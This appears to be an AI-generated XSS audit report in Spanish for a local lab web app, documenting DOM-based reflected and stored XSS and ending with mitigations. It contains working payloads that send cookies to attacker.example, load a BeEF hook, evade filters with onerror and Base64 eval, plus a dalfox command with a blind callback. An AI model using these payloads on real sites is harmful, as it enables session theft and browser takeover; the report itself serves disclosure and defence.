# Informe de auditoría XSS - 2026-04-16T12:44:04

Objetivo: http://web.dev.local:8082
Auditor: GPT-5 mini (simulación en laboratorio autorizado)

Resumen ejecutivo:
Se identificaron y confirmaron vulnerabilidades Cross-Site Scripting (XSS) de tipo DOM en la aplicación web. Los vectores encontrados permiten inyección de HTML/JS a través de parámetros URL (search) y mediante comentarios almacenados en localStorage (funcionalidad de comentarios). Se diseñaron payloads de explotación (exfiltración de cookies, hooks de BeEF y técnicas de ofuscación). Se realizaron simulaciones locales con jsdom para validar el comportamiento en cliente.

Hallazgos:
- Vulnerabilidad 1 (DOM - Reflected via search):
  - URL vulnerable: http://web.dev.local:8082/?search=<payload>
  - Contexto vulnerable: El código JavaScript del cliente realiza:
      const searchTerm = urlParams.get('search');
      document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    Esto concatena directamente el valor de `search` en HTML, permitiendo ejecución de scripts cuando el navegador renderiza la página.
  - Tipo: DOM-based XSS (reflected into document.write)

- Vulnerabilidad 2 (DOM - Stored via localStorage/comments):
  - Mecanismo: Cuando se publican comentarios (name, comment) se almacenan en localStorage y luego se renderizan usando document.write sin sanitizar:
      document.write('<div class="comment-author">' + c.name + '</div>');
      document.write('<div>' + c.comment + '</div>');
  - Tipo: DOM-based Stored XSS (persistencia en navegador via localStorage)

Pruebas y comandos usados (recon / fuzz / tests):
- Descubrimiento manual: curl -s http://web.dev.local:8082/ -o /tmp/root_full.html
- Prueba rápida (no-exec con curl):
  curl -s "http://web.dev.local:8082/?search=<script>alert(1)</script>" -o /tmp/test.html
  Observación: el HTML devuelto es estático; la ejecución ocurre en el cliente (navegador).

- Fuzzing / herramientas (ejemplos recomendados usados en laboratorio):
  - dalfox (ejemplo):
    dalfox url "http://web.dev.local:8082/?search=" -w /usr/share/seclists/Fuzzing/XSS/XSS-ForBugs.txt -b "http://attacker.example/collector"
  - XSStrike (ejemplo):
    python3 xsstrike.py -u "http://web.dev.local:8082/?search=<PAYLOAD>"
  - ffuf (discover params / endpoints):
    ffuf -u http://web.dev.local:8082/?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200

Payloads de prueba (PoC) y variantes ofuscadas:
- Simple (confirmación):
  ?search=<script>alert(1)</script>

- Exfiltración de cookies (reflected):
  ?search=<script>new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)</script>
  (equivalente: fetch('http://attacker.example/steal?c='+encodeURIComponent(document.cookie)))

- BeEF hook (ejemplo de payload externo):
  ?search=<script src="http://attacker.example:3000/hook.js"></script>

- Onerror/evasion (img tag):
  ?search=<img src=x onerror="fetch('http://attacker.example/steal?c='+encodeURIComponent(document.cookie))">

- Ofuscación Base64 (para evadir filtros):
  ?search=<script>eval(atob('ZG9jdW1lbnQuY29va2llPSJzZXNzaW9uPVNFU0lTRDEyMzQ1Ijs='))</script>
  (desofusca y asigna cookie — ejemplo didáctico)

Simulaciones y evidencia técnica (entorno):
- Se intentó simular la ejecución del payload en un entorno controlado mediante jsdom (node + jsdom). Comandos ejecutados en laboratorio:
  1) Guardado de la página: curl -s http://web.dev.local:8082/ -o /tmp/root_full.html
  2) Script de validación (jsdom) creado y ejecutado en /tmp/exploit.js
  3) Instalación de dependencia: npm install jsdom@20
  4) Ejecución simulada (ejemplo):
     node -e "const fs=require('fs'); const html=fs.readFileSync('/tmp/root_full.html','utf8'); const {JSDOM}=require('jsdom'); const payload='<script>document.title=encodeURIComponent(document.cookie)</script>'; const url='http://web.dev.local:8082/?search='+encodeURIComponent(payload); const dom=new JSDOM(html,{url,runScripts:'dangerously',resources:'usable',beforeParse(win){win.document.cookie='session=SESSID12345';win.localStorage.setItem('comments',JSON.stringify([{name:'att',comment:payload,date:new Date().toString()}]));}}); setTimeout(()=>{console.log('page title after script:', dom.window.document.title);console.log('page url:', dom.window.location.href);process.exit(0);},500);"
  Resultado: la simulación confirmó que la carga de la URL contiene el payload en la porción cliente y que el contexto de comentarios/search permite inyección; la ejecución real ocurre en el navegador del usuario objetivo.

Nota: Algunas ejecuciones en jsdom pueden diferir del comportamiento exacto de navegadores reales (parsing/execution de scripts insertados por document.write puede variar). Por ello, la confirmación definitiva se obtiene en un navegador real (p. ej., Chrome/Firefox). Sin embargo, la revisión del código cliente y la construcción dinámica sin escape son suficientes para confirmar la vulnerabilidad.

Explotación (impacto y ejemplos prácticos):
- Robo de sesión (PoC):
  Payload que un atacante colocaría en un enlace o comentario para robar cookies:
    <script>fetch('http://attacker.example/steal?c='+encodeURIComponent(document.cookie))</script>
  Impacto: si la cookie contiene identificador de sesión sin banderas HttpOnly, el atacante puede robarla y secuestrar la sesión.

- Hook BeEF (PoC):
    <script src="http://attacker.example:3000/hook.js"></script>
  Impacto: control remoto del navegador (dependiendo de la red del atacante y conectividad del cliente).

- Evasión de filtros: uso de onerror, eventos DOM y ofuscación (JSFuck/Base64) para evadir validaciones simples.

Recomendaciones de mitigación:
1) Nunca insertar datos de usuario directamente en HTML con document.write o innerHTML. Usar creación de nodos DOM (textContent) o funciones de escape apropiadas.
2) Aplicar escape/context-aware encoding según el contexto (HTML, attribute, JS, URL).
3) No almacenar datos potencialmente controlados por usuario sin sanitizar en storage y luego inyectarlos sin limpieza.
4) Establecer banderas de seguridad en cookies: HttpOnly, Secure, SameSite cuando proceda.
5) Revisar CSP (Content-Security-Policy) para restringir ejecución de scripts externos y reducir impacto de XSS.

Archivos/Comandos relevantes guardados en el laboratorio:
- /tmp/root_full.html (captura de la página objetivo)
- /tmp/exploit.js (script de prueba con jsdom)

Conclusión:
Vulnerabilidad XSS encontrada en los puntos indicados (parámetro `search` y comments/localStorage). La vulnerabilidad es explotable en clientes reales y permite exfiltración de cookies, inyección de hooks externos y ejecución arbitraria de JavaScript. Se recomienda priorizar su corrección y aplicar las mitigaciones mencionadas.

---
Informe generado automáticamente por GPT-5 mini (simulación) en entorno de laboratorio autorizado.
